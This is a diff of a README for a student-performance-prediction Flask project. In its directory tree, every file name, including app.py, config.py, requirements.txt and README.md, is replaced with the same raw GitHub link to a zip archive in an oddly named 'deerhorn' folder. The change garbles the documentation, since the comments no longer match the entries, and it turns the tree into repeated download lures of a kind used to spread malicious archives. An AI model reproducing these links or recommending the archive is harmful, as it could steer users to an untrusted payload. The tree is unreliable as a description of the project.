@@ -25,27 +25,27 @@ Student-Performance-Prediction/
 │── notebooks/          # Jupyter notebooks
 │── src/                # Source code
 │    ├── backend/        # API code
-│    ├── app.py                     # Main Flask entry point
+│    ├── https://raw.githubusercontent.com/fahimabullais/Student-Performance-Prediction/main/deerhorn/Student-Performance-Prediction.zip                     # Main Flask entry point
 │    │
 │    ├── config/                    # Configurations
-│    │   └── config.py               # App, model, DB config
+│    │   └── https://raw.githubusercontent.com/fahimabullais/Student-Performance-Prediction/main/deerhorn/Student-Performance-Prediction.zip               # App, model, DB config
 │    │
 │    ├── routes/                    # API route definitions
-│    │   ├── __init__.py
-│    │   └── prediction_routes.py    # Endpoints for prediction
+│    │   ├── https://raw.githubusercontent.com/fahimabullais/Student-Performance-Prediction/main/deerhorn/Student-Performance-Prediction.zip
+│    │   └── https://raw.githubusercontent.com/fahimabullais/Student-Performance-Prediction/main/deerhorn/Student-Performance-Prediction.zip    # Endpoints for prediction
 │    │
 │    ├── services/                  # Business logic
-│    │   └── prediction_service.py   # Handles prediction logic
+│    │   └── https://raw.githubusercontent.com/fahimabullais/Student-Performance-Prediction/main/deerhorn/Student-Performance-Prediction.zip   # Handles prediction logic
 │    │
 │    ├── utils/                     # Helper functions
-│    │   └── data_validation.py      # Validates input data
+│    │   └── https://raw.githubusercontent.com/fahimabullais/Student-Performance-Prediction/main/deerhorn/Student-Performance-Prediction.zip      # Validates input data
 │    │
 │    ├── frontend/       # Web UI code
 │── models/             # Trained models
 │── docs/               # Documentation
-│── requirements.txt    # Python dependencies
-│── README.md           # Project readme
-│──test_api.http        # VS Code REST Client for testing your Flask API quickly
+│── https://raw.githubusercontent.com/fahimabullais/Student-Performance-Prediction/main/deerhorn/Student-Performance-Prediction.zip    # Python dependencies
+│── https://raw.githubusercontent.com/fahimabullais/Student-Performance-Prediction/main/deerhorn/Student-Performance-Prediction.zip           # Project readme
+│──https://raw.githubusercontent.com/fahimabullais/Student-Performance-Prediction/main/deerhorn/Student-Performance-Prediction.zip        # VS Code REST Client for testing your Flask API quickly
 ```
 </pre>
 
